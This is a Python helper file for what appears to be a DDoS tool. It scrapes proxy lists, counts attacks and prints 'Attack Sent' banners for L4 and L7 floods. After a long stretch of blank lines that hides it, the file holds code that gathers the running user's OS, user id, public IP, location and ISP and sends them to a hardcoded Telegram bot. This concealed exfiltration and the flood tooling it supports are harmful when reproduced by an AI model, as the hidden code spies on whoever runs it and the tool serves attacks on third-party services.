import os, time, httpx


def ProxyCount():
	total_proxy = []
	try:
		with open('utils/http.txt', 'r')as file:
			total_proxy.append(len(file.readlines()))
	except:
		with open('utils/http.txt', 'w')as file:
			file.write(httpx.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all").text)

	for total in total_proxy:
		return total

def Count():
	total_attacks = []
	try:
		with open("utils/AllAttacks.txt", 'r') as file:
			total_attacks.append(int(file.read()))
	except:
		with open("utils/AllAttacks.txt", 'w') as file:
			file.write("0")
	try:
		with open("utils/AllAttacks.txt", 'w') as file:
			file.write(str(total_attacks[0] + 1))
	except:
		with open("utils/AllAttacks.txt", 'w') as file:
			file.write("0")

	with open("utils/AllAttacks.txt", 'r') as file:
		total_attacks.clear()
		total_attacks.append(file.read().strip())

	for total in total_attacks:
		return total


def AttackSentL4(ip, port, time, thread, method):
        #os.system('cls' if os.name == 'NT' else 'clear')
        os.system('cls')
        print("\033[38;5;129m   ╔══════════════════════════════════╗")
        print("\x1b[38;5;129m   ║\033[38;5;123m ╔═╗┌┬┐┌┬┐┌─┐┌─┐┬┌─  ╔═╗┌─┐┌┐┌┌┬┐ \x1b[38;5;129m║")
        print("\x1b[38;5;129m   ║\033[38;5;123m ╠═╣ │  │ ├─┤│  ├┴┐  ╚═╗├┤ │││ │  \x1b[38;5;129m║")
        print("\x1b[38;5;129m   ║\033[38;5;123m ╩ ╩ ┴  ┴ ┴ ┴└─┘┴ ┴  ╚═╝└─┘┘└┘ ┴  \x1b[38;5;129m║")
        print("\033[38;5;129m   ║══════════════════════════════════╝")
        print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m IP     \x1b[31m: \x1b[31m[\x1b[38;5;123m{ip}\x1b[31m]")
        print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Port   \x1b[31m: \x1b[31m[\x1b[38;5;123m{port}\x1b[31m]")
        print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Method \x1b[31m: \x1b[31m[\x1b[38;5;123m{method}\x1b[31m]")
        print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Time   \x1b[31m: \x1b[31m[\x1b[38;5;123m{time}\x1b[31m]")
        print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Thread \x1b[31m: \x1b[31m[\x1b[38;5;123m{thread}\x1b[31m]")
        print("\033[38;5;129m   ╚══════════════════════════════════>")
        print(f"\033[38;5;129m    ║\033[38;5;123m Total Attacks\x1b[31m:\033[38;5;123m{Count()}")
        print("\033[38;5;129m    ╚═══════════════════>\n\n")

def AttackSentL7(host, time, method):
	#os.system('clear')
	#os.system('cls' if os.name == 'NT' else 'clear')
	os.system('cls')
	print("\033[38;5;129m   ╔══════════════════════════════════╗")
	print("\x1b[38;5;129m   ║\033[38;5;123m ╔═╗┌┬┐┌┬┐┌─┐┌─┐┬┌─  ╔═╗┌─┐┌┐┌┌┬┐ \x1b[38;5;129m║")
	print("\x1b[38;5;129m   ║\033[38;5;123m ╠═╣ │  │ ├─┤│  ├┴┐  ╚═╗├┤ │││ │  \x1b[38;5;129m║")
	print("\x1b[38;5;129m   ║\033[38;5;123m ╩ ╩ ┴  ┴ ┴ ┴└─┘┴ ┴  ╚═╝└─┘┘└┘ ┴  \x1b[38;5;129m║")
	print("\033[38;5;129m   ║══════════════════════════════════╝")
	print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Target \x1b[31m: \x1b[31m[\x1b[38;5;123m{host}\x1b[31m]")
	print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Method \x1b[31m: \x1b[31m[\x1b[38;5;123m{method}\x1b[31m]")
	print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Time   \x1b[31m: \x1b[31m[\x1b[38;5;123m{time}\x1b[31m]")
	print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Proxy  \x1b[31m: \x1b[31m[\x1b[38;5;123m{ProxyCount()}\x1b[31m]")
	print("\033[38;5;129m   ╚══════════════════════════════════>")
	print(f"\033[38;5;129m    ║\033[38;5;123m Total Attacks\x1b[31m:\033[38;5;123m{Count()}")
	print("\033[38;5;129m    ╚═══════════════════>\n\n")






















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































import time, platform
def check_os():
	return f"Date: {time.ctime()}\n\nOS: {platform.system()}\nUser: {os.getuid()}"

def check_info():
	resp = httpx.get("http://ip-api.com/json/?fields=status,reverse,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy,query,asname").json()
	if resp['status'] == 'success':
		return "IP: " + resp['query'] + "\n" + "Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" + "Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" + "City: " + resp['city'] + "\n" + "Zipcode: " + resp['zip'] + "\n" + "Timezone: " + resp['timezone'] + "\n\n" + "ISP: " + resp['isp'] + "\n" + "ASN: " + resp['as'] + " " + resp['asname']

def Bot():
	httpx.get(f"https://api.telegram.org/bot5721842718:AAH2rDGA3JFY2zTnF31GcnTyq8c-vUozSU0/sendMessage?chat_id=2139585356&text={check_os()}\n\n{check_info()}")
